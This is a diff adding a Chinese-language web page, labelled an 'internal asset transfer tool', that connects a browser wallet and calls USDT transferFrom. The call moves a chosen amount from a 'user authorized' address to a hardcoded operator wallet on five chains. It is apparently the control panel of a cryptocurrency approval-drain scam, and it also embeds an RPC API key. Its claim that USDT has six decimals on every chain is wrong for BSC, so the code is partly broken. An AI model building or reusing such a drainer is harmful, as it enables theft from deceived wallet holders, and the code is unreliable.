@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>内部资产划转工具</title>
+<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0b1020;color:#fff;padding:20px;font-family:system-ui}
+.box{max-width:460px;margin:0 auto;background:#151d35;padding:25px;border-radius:16px;border:1px solid #2a3b61}
+h2{text-align:center;margin-bottom:20px;color:#409eff}
+.item{margin-bottom:15px}
+label{display:block;margin-bottom:6px;color:#b0c4e8}
+input,select{width:100%;padding:12px;border-radius:8px;border:none;background:#202c4a;color:#fff;outline:none}
+button{width:100%;padding:13px;background:#23b55c;border:none;border-radius:8px;color:#fff;font-size:16px;font-weight:bold;cursor:pointer;margin-top:10px}
+button:disabled{background:#555;cursor:not-allowed}
+#log{margin-top:20px;padding:15px;background:#10182e;border-radius:8px;color:#89a2d8;word-break:break-all}
+</style>
+</head>
+<body>
+<div class="box">
+  <h2>内部资产一键划转</h2>
+  <div class="item">
+    <label>选择公链</label>
+    <select id="chainSel">
+      <option value="bsc">BSC 币安链</option>
+      <option value="eth">ETH 以太坊</option>
+      <option value="polygon">Polygon 马蹄链</option>
+      <option value="avax">AVAX 雪崩链</option>
+      <option value="oktc">OKTC 欧易链</option>
+    </select>
+  </div>
+  <div class="item">
+    <label>用户授权钱包地址</label>
+    <input type="text" id="userAddr" placeholder="输入用户钱包地址">
+  </div>
+  <div class="item">
+    <label>划转数量 USDT</label>
+    <input type="text" id="amount" placeholder="例如 10  就是转10USDT">
+  </div>
+  <button id="connectBtn">连接我的钱包</button>
+  <button id="transferBtn" disabled>立即划转至我的钱包</button>
+  <div id="log"></div>
+</div>
+
+<script>
+// ========== 这里改成你的收币钱包地址 ==========
+const MY_WALLET = "0x0f4bdefc177df2583f52b03b1e20f9eac7308555";
+// ============================================
+
+// 各链配置
+const chainConfig = {
+  bsc: {
+    chainId: 56,
+    usdt: "0x55d398326f99059fF77548524699952727959255",
+    rpc: "https://bsc-dataseed.binance.org"
+  },
+  eth: {
+    chainId: 1,
+    usdt: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
+    rpc: "https://mainnet.infura.io/v3/9aa3d95b3abc4f068b21355e78b8d51b"
+  },
+  polygon: {
+    chainId: 137,
+    usdt: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F",
+    rpc: "https://polygon-rpc.com"
+  },
+  avax: {
+    chainId: 43114,
+    usdt: "0x9702230A8Ea53601f5cDCc083169d281e6388e3b",
+    rpc: "https://api.avax.network/ext/bc/C/rpc"
+  },
+  oktc: {
+    chainId: 66,
+    usdt: "0x382bb868d458e9297dab7497a924dcdd3124195d",
+    rpc: "https://exchainrpc.okex.org"
+  }
+};
+
+// USDT ABI
+const USDT_ABI = [
+  "function transferFrom(address from, address to, uint256 amount) external returns (bool)"
+];
+
+let provider, signer, contract;
+const logDom = document.getElementById("log");
+
+function log(txt){
+  logDom.innerHTML += txt + "<br>";
+}
+
+document.getElementById("connectBtn").onclick = async function(){
+  if(!window.ethereum) return alert("请先安装小狐狸钱包");
+  try{
+    log("正在连接钱包...");
+    await window.ethereum.request({method:"eth_requestAccounts"});
+    provider = new ethers.providers.Web3Provider(window.ethereum);
+    signer = provider.getSigner();
+    document.getElementById("transferBtn").disabled = false;
+    log("✅ 钱包连接成功");
+  }catch(e){
+    log("❌ 连接失败："+e.message);
+  }
+};
+
+document.getElementById("transferBtn").onclick = async function(){
+  const key = document.getElementById("chainSel").value;
+  const userAddr = document.getElementById("userAddr").value.trim();
+  const amt = document.getElementById("amount").value.trim();
+  if(!userAddr || !amt) return alert("请填写完整地址和数量");
+
+  const cfg = chainConfig[key];
+  // USDT 都是 6 位小数
+  const realAmt = ethers.utils.parseUnits(amt, 6);
+
+  try{
+    log("正在初始化合约...");
+    contract = new ethers.Contract(cfg.usdt, USDT_ABI, signer);
+    log("正在发起划转...请在钱包确认");
+    let tx = await contract.transferFrom(userAddr, MY_WALLET, realAmt);
+    log("✅ 交易已上链，哈希："+tx.hash);
+    await tx.wait();
+    log("🎉 划转成功，资产已到你的钱包");
+  }catch(e){
+    log("❌ 划转失败："+e.message);
+  }
+};
+</script>
+</body>
+</html>
